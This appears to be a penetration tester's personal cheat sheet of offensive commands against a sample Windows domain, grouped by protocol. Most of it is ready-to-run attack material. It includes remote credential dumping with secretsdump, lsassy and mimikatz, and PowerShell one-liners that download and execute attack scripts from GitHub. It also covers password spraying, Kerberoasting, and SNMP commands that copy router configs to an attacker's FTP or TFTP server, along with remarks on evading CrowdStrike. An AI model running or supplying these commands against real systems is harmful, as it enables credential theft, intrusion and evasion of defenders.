# EVERY VILLAIN IS LEMONS
This file contains all the eeevvvvil pentesting notes, handy commands, and the like that could be found useful. Organized by protocol (or environment) and tool.

Notes:
 * Impacket for the most part allows you to auth with Kerberos, using `-k`. You will need to export a local file `KRB5CCNAME` with the ticket in it.
 * Impacket for the most part also supports hash passing (overpass the hash?) because...well Microsoft: `-hashes LMhash:NThash`
 
References:
 * https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
 * https://ired.team/offensive-security/ (Fantastic - good for stealth options!)

## TCP/445 SMB
- Check for NULL sessions (target DCs mostly):
  ```
  rpcclient -U '' dc.firenation.com   # NULL _needs_ the -U ''
  ```
- Auth session to get domain users, groups, etc.
  ```
  rpcclient -U 'azula%F!r3R0cks!' dc.firenation.com` | tee rpcclient-enumdomusers.txt
  > enumdomusers
  ```
- Check owned creds for local administrator access
  ```
  CredNinja.py -s subnets.lst -a 'firenation.com/azula:S0z1nsC0m3t' --scan --valid --users | tee cred-check.out
  CredNinja.py -s subnets.lst -a 'firenation.com/azula:NThash' --scan --valid --users --ntlm | tee cred-check.out
  ```
- If you have local admin somewhere, use secretsdump.py to remotely dump SAM hashes:
  ```
  secretsdump.py 'firenation.com/azula:S0z1nsC0m3t@10.11.1.11'
  secretsdump.py -hashes LMhash:NThash 'firenation.com/azula@10.11.1.11'
  ```
  As far as I've seen, this is not being caught when run remotely. CrowdStrike hasn't alerted on it yet.
- [ ] See if you can do a remote LSASS dump using `lsassy`:
  ```
  lsassy -d firenation.com -u azula -p S0z1nsC0m3t subnet-or-file-with-nmap-syntax.lst
  ```
  This is **extremely** noisy and CrowdStrike or other tools may absolutely explode, and stop you or at the very least generate alerts. It's not meant to be stealthy.
  - [ ] With SAM hashes, run those through `CredNinja.py` as shown above to see if you owned a network-wide local admin
  - [ ] Log in to target machines with via SMB and look for interesting files:
   ```
   smbclient.py 'firenation.com/azula:S0z1nsC0met@10.11.1.11'
   ## TODO: plunder
   ```
  - [ ] Look for user shares/SMB servers and see if there are lax permissions. See if you can find password files, sensitive data, hardcoded creds in scripts, SSH keys, anything juicy.
    - [ ] See some interesting attacks like [this](https://www.criticalstart.com/from-the-trenches-relaying-passwords-for-the-win/) and [this](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)  
  

## TCP/636 LDAP/LDAPS/Active Directory  
- [ ] Run BloodHound/SharpHound ingestor:
  ```
  # From windows on cmd.exe on domain-joined machine:
  powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound -CollectionMethod all"
  # From windows in powershell.exe from non-domain-joined machine:
  IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound -CollectionMethod all -Domain firenation.com -LdapUsername azula -LdapPassword S0z1nsC0m3t
  # From Kali with bloodhound.py
  bloodhound.py azula@firenation.com -p S0z1nsC0m3t -c All
  ```
  - [ ] Get `users.json` and extract a list of users for sprayin' and prayin'
  - [ ] Identify account lockout policy and duration `net accounts` (TODO: can also be grabbed via GPO on DC)
  - [ ] Spray n' pray mindful of above: `hydra -L users.lst -p 'Spring202X!' smb://target-smb-server`
  - [ ] Mark users as `Owned` as you go (if you get either their NT hash or cleartext creds), constantly looking for escalation paths
  - [ ] Search around and get a good feel for the environment. Mark certain interesting targets as high-value.


## TCP/88 Kerberos
- KRB5 Guessing
  - Install the tool. Requires specific Java version:
    ```
    pushd /opt/
    wget http://www.cqure.net/tools/krbguess-0.21-bin.tar.gz
    tar xvf krbguess-0.21-bin.tar.gz
    rm  krbguess-0.21-bin.tar.gz
    echo "alias krbguess='/usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar /opt/KrbGuess/krbguess.jar'" >> /root/.bash_aliases
    popd
    ```
  - Identify the naming convention used (check OSINT for emails, printers, network traffic, etc.), then check [this repo](https://github.com/insidetrust/statistically-likely-usernames) for massive lists of usernames. This should be enough in large enviros.
    ```
    krbguess --realm firenation.com --server dc.firenation.com --dict jsmith.txt -o krbguess-jsmith-firenation.txt
    ```
- Kerberoasting
  - Impacket has a great python port. [TODO: check output for hashes]
    ```
    GetUserSPNs.py 'firenation/azula:Fir3R0cks' -o getuserspns-firenation.txt
    ```
  - Powershell port:
    ```
    powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat"
    ```
    

## UDP/161 SNMP
- Run `onesixtyone` to guess some SNMP strings:
  ```
  wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -o snmp-strings.txt
  onesixtyone -c snmp-strings.txt -i hosts.txt -o onesixtyone-snmp-guess.txt
  ```
- Set up FTP server and FTP using a SNMP write string. Similar method for TFTP (which doesn't try to auth but could be blocked). Check the blog for TFTP instructions. Remember to have a 777 file in the TFTP root you're using.
  ```
  # Install FTP server.
  # See https://www.ciscozine.com/how-to-save-configurations-using-snmp/
  sudo apt-get install pure-ftpd
  sudo adduser ftpman --home /tmp/
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.2.1337 i 2
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.3.1337 i 4
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.4.1337 i 1
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.5.1337 a 10.10.10.10
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.6.1337 s running.config
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.7.1337 s ftpman
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.8.1337 s ftpmanPASS
  snmpwalk -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1
  snmpwalk -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.14.1337 i 2
  snmpwalk -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1
  ```
- Do it over TFTP:
  ```
  # 336 is the ID, it lasts 5 minutes. You can clear it if needed.
  snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.2.336 i 1
  snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.3.336 i 4
  snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.4.336 i 1
  snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.5.336 a [ip-tftp-server]
  snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.6.336 s [file-name]   # don't forget touch && chmod 777
  snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.14.336 i 1
  ```
- `muts` wrote a [quick perl script to copy over the config](https://tools.kali.org/information-gathering/copy-router-config), native to Kali:
  ```
  copy-router-config.pl target_router evil_tftp_server private_snmp_string
  # Modify the file appropriately, crack the SSH creds, etc.
  # Check the similar merge-router-config.pl
  ```

## TCP/80 HTTP
Includes web services (not just port 80)
- Check for Jenkins
  - Exploit Jenkins
- Check for Splunk


## TCP/3389 Remote Desktop Protocol (RDP)
- Scan for BlueKeep:
  ```
  msfconsole
  spool msf-bluekeep-scan.txt
  use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
  set RHOSTS open-ports/3389.txt
  set THREADS 10
  run
  ```
- Exploiting BlueKeep
  - MSF has a module, but it will likely DoS Win2k8. Win7 is more stable and can get you a shell.
  - NCC has some internal exploits you may want to try if this is your only option.
  

## Linux

## Windows
- [ ] Can you RDP in and dump LSASS for to extract with MMK locally? If it's a really poorly-protected/monitored enviro can you invoke mimikatz?
  ```
  # Invoke Mimikatz. Careful, likely won't work with AMSI etc.
  powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
  # Or procdump.exe from sysinternals:   
  ```
  Fairly easy to RDP in, open Task Manager, find `lsass.exe` (might be `Local Security Authority...`), right click, and `Create Dump File`.
  ```
  # Run Mimikatz on your machine:
  sekurlsa::minidump C:\Users\admin\Documents\lsass.dmp
  sekurlsa::logonpasswords
  ```

## Password Cracking
## Local Cracking
 - [ ] Clone [SecLists](https://github.com/danielmiessler/SecLists.git): `cd /opt/ && git clone https://github.com/danielmiessler/SecLists.git`
 - [ ] Use JtR on your first go locally for quick wins. Kill it if it's mega hecka slow.
   ```
   john --list=formats    # lists formats for hashes
   john hashes.txt --format=nt --rules=all
   john hashes.txt --format=nt --wordlist=/usr/share/wordlists/rockyou.txt
   john hashes.txt --format=nt --wordlist=/usr/share/wordlists/rockyou.txt --rules
   ```
- CREATE THE KRAKEN!
 - Spin up a `p3.16xlarge` in AWS to get some sweet GPU power
 - SSH in and set up your environment:
   ```
   sudo apt update && sudo apt -y upgrade && sudo apt -y dist-upgrade
   sudo apt install -y ubuntu-drivers-common
   sudo ubuntu-drivers autoinstall
   sudo apt install -y opencl-headers ocl-icd-libopencl1 clinfo hashcat
   sudo shutdown -r now
   ```
 - Get [Praetorian rules](): `wget praetorian-rules -O /opt/rules.txt`
 - Get bigbutt wordlist: `wget bigbutt-wordlist-O /opt/words.lst`
- RELEASE THE KRAKEN!
 - Straight wordlist attack: `hashcat ` ADD MOAR
 - Add rules:
 - Quick cheatsheet for hash modes:
   ```
   500    MD5
   1000   NT hash (from SAM dump/NTDS)
   5600   Net-NTLMv2 (from Responder, ntlmrelayx.py)
   13100  Kerberoast hashes (KRB5TGS 23)
   ```
## OSINT
- Harvest emails:
  - `theHarvester`: 
    ```
    theHarvester -d firenation.com -b all
    sqlite3
    > select * from results
    ```
- DNS and Email checks
  - SPF, DMARC, and DKIM settings:
    ```
    dig txt firenation.com                       # check for SPF
    dig txt _dmarc.firenation.com                # check for DMARC
    dig txt selector._domainkey.firenation.com   # check for DKIM
    ```